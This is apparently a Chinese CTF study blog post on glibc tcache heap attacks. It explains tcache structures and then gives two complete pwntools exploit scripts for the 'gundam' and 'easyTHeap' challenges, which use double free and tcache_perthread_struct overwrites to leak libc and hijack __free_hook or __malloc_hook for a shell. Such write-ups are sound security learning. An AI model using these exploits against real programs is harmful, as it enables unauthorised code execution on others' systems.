---
title:  Tcache attack初学习——学pwn小记(8)
categories: [CTF]
tags: [pwn]

---

Tcache是2.26 libc中新引入的一种缓存的机制,由于它对每个线程增加一个bin缓存，这样能显著地提高性能.这样一个机制在提高效率的同时也带来了安全隐患.<!-- more -->

## Tcache相关数据结构

`tcache_entry`和`tcache_perthread_struct`是跟Tcache相关的两个结构.

```c
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
static __thread tcache_perthread_struct *tcache = NULL;
```

`tcache_entry`是存放相同大小堆块中，最后一块放入`Tcache`的`Tcache bin`的指针。（然后有点类似fast bin再在这块中的`fd`位置写入上一个放入`Tcache`的堆块内容（用户数据，即堆头+0x10）的指针）

`tcache_perthread_struct`是主要用来存放管理Tcache的结构体，这个结构体分两部分来看待：

用来统计存放放入`Tcache`中各大小bin的数量。

存放各大小bin中，最优先被取出的bin的地址。

`tcache_perthread_struct`中具体存放的多少由宏定义中的`TCACHE_MAX_BINS`来确定。

```c
#if USE_TCACHE
/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
# define TCACHE_MAX_BINS        64 /*tcache 每个大小bins 种类数*/
# define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)
/* Only used to pre-fill the tunables.  */
# define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
/* When "x" is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))
/* With rounding and alignment, the bins are...
   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1   bytes 25..40 or 13..20
   idx 2   bytes 41..56 or 21..28
   etc.  */
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7  /*tcache 每个大小bins 最大存放数量*/
```

## pwn中利用方法

### 二次释放

由于tcahe 检测在free和malloc 靠前位置导致一些检测未进行。因此在tcache中我们可直接free 二次同一堆块，即可照成二次释放。

![image-20210418131641002](image-20210418131641002.png)



### 塞满tcahe泄露libc

我们可以通过free 7个 bins塞满tcahe后，释放一个unsortedbin来泄露地址。

![image-20210418132000075](image-20210418132000075.png)

#### 例题：gumad

分析题目，利用连续free 7个chunk 塞满tcache，再释放一个unsortedbin来泄露地址。

再利用二次释放,改fd带chunk 0指针存放处,改chunk 0 fd指针为free_hook.再在free_hook处创造chunk 写入shell.

```python
from pwn import *
#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)
p=process('./gundam')
#context.log_level = 'debug'
def build(name):
    p.sendlineafter("choice : ","1")
    p.sendlineafter("gundam :",name)
    p.sendlineafter("gundam :",'0')

def visit():
    p.sendlineafter("choice : ",'2')

def free(idx):
    p.sendlineafter("choice : ",'3')
    p.sendlineafter("Destory:",str(idx))

def blow_up():
    p.sendlineafter("choice : ",'4')


for i in range(9):
	build('a'*0x10)

for i in range(8):
	free(i)
blow_up()
for i in range(7):
	build('a'*0x4)
build('B'*7)
blow_up()
visit()
addr = (p.recvuntil("Type[7]",drop=True)[-6:].ljust(8,'\x00'))
print(addr)
#gdb.attach(p)
print(hex(u64(addr)))
base=u64(addr)-0x3afca0
print(hex(base))
free_hook=base+0x3b18e8
print('4')
free(5)
free(4)
free(3)
blow_up()
free(2)
free(1)
free(0)
free(0)

build(p64(free_hook))

build('/bin/sh\x00')

build(p64(base+0x41780))

free(0)
gdb.attach(p)

p.interactive()
```



### 更改tcache_perthread_struct

`tcache_perthread_struct`一般是堆开头的第一个堆块，大小为0x250(amd64).我们可以通过gdb中`bins`与`p *(struct tcache_perthread_struct*)`来查看其信息。

![image-20210418133641326](image-20210418133641326.png)

我们也可以同过其他tache漏洞，使我们获得更改此处的权利。就可以让某大小计数大于`TCACHE_FILL_COUNT`（从而假造tache已满的情况泄露libc）。也可以篡改`entries`中保存的指针指向任意地方。

#### 例题：[V&N2020 公开赛]easyTHeap

题目限制了只能free3次和malloc 7次任意大小chunk。

利用二次释放在`tcache_perthread_struct`处，创造fack chunk。从而修改`tcache_perthread_struct`的值将假造tache已满的情况。从而free出libc。

再改`tcache_perthread_struct`的entries区域的内容，使某一大小的bin的指针变成我们fack chunk的指针从而改写`__realloc_hook`与`__moalloc_hook`，从而执行one_gadget.



```python
from pwn import *

e=ELF('/glibc/2.27/amd64/lib/libc.so.6')
p=process('./vn_pwn_easyTHeap')

def add(size):
	p.recvuntil('choice')	
	p.sendline('1')
	p.recvuntil('size')
	p.sendline(str(size))

def edit(num,text):
	#p.recvuntil('choice')	
	p.sendline('2')
	p.recvuntil('idx')
	p.sendline(str(num))
	p.recvuntil('content')
	p.sendline((text))
	

def show(num):
	p.recvuntil('choice')	
	p.sendline('3')
	p.recvuntil('idx?')
	p.send(str(num))

def free(num):
	p.recvuntil('choice')	
	p.sendline('4')
	p.recvuntil('idx')
	p.sendline(str(num))
	

add(0x80)#0


free(0)
free(0)

add(0x80)#1

show(0)

addr=u64(p.recv(6).ljust(8,'\x00'))
log.info(hex((addr)))
log.info('tcache struct:'+hex((addr-0x250)))
edit(1,p64(addr-0x250))
add(0x80)#2
add(0x80)#3
gdb.attach(p)
edit(3,p8(7)*0x30)

free(3)

show(3)

addr=u64(p.recv(6).ljust(8,'\x00'))-88
log.info('main_arena:'+hex((addr)))
base=addr-0x3afc48
log.info('base:'+hex((base)))
malloc=base+e.symbols['__malloc_hook']
log.info('malloc:'+hex((malloc)))
#gdb.attach(p)
add(0x80)#4
edit(4,'b'*0x48+p64(malloc-0x20+0xd))
#gdb.attach(p)

"""
0x41612 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x41666 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xdeed2 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL



"""
add(0x60)#5
edit(5,p8(0)*3+p64(0)+p64(0x41666+base)+p64(base+e.symbols['__libc_realloc']+0xa))
#gdb.attach(p)
add(0x40)


p.interactive()

```

## 参考文献

https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning